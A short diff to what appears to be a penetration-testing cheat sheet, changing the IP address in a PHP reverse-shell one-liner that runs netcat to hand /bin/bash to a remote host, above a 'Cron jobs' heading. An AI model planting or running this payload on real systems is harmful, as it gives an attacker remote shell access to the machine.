@@ -112,10 +112,10 @@ except:
 sys.exit(0) 
 ```
 
-php
+php(file)
 
 ```
-<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>
+<?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
 ```
 
 ### :open_file_folder: Cron jobs
